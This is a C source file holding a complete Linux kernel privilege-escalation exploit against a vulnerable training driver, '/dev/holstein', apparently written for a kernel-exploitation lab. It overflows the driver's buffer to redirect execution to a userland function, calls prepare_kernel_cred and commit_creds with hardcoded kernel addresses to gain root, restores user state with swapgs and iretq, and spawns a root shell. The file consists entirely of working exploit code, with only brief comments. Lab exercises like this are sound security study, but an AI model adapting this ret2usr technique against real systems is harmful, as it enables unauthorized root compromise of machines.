#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#define DEVICE "/dev/holstein"
#define BUFFER_SIZE 0x400

#define KBASE 0xffffffff81000000
#define HOLSTEIN_WRITE 0Xffffffffc0000120

unsigned long prepare_kernel_cred = 0xffffffff8106e240;
unsigned long commit_creds = 0xffffffff8106e390;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void save_state() {
    asm volatile(
        ".intel_syntax noprefix;"
        "mov _proc_cs, cs;"
        "mov _proc_ss, ss;"
        "mov _proc_rsp, rsp;"
        "pushf;"
        "pop _proc_rflags;"
        ".att_syntax"
        );

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}

void restore_state() {
    asm volatile(
        ".intel_syntax noprefix;"
        "swapgs;" 
        "mov r15, _proc_ss;"
        "push r15;"
        "mov r15, _proc_rsp;"
        "push r15;"
        "mov r15, _proc_rflags;"
        "push r15;"
        "mov r15, _proc_cs;"
        "push r15;"
        "lea r15, spawn_shell;" 
        "push r15;"
        "iretq;"
        ".att_syntax"
        );
}

void escalate_privilege() {
    // was initially put save state here, but since we still executing
    // in the kernel context, save state will cause a crash, we need
    // to save the state in the user land context anyways
    // save_state();

    char * (*pkc)(int) = (void *)prepare_kernel_cred;
    void (*cc)(char *) = (void *)commit_creds;
    (*cc)((*pkc)(0));

    restore_state();
}

void spawn_shell()
{
    puts("[+] Hello Userland!");

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);
    save_state();
    
    int fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        perror("[-] open");
        exit(1);
    }
    printf("[+] device opened at: %d\n", fd);

    char payload[0x500] = {0x0};
    *(unsigned long *)(&payload[0x408]) = (unsigned long) &escalate_privilege;
    printf("[*] expected rip: %p\n", &escalate_privilege);
    if (write(fd, payload, 0x410)) {
        perror("[-] write");
        exit(1);
    }

    printf("[*] ...\n");
    getchar();   
}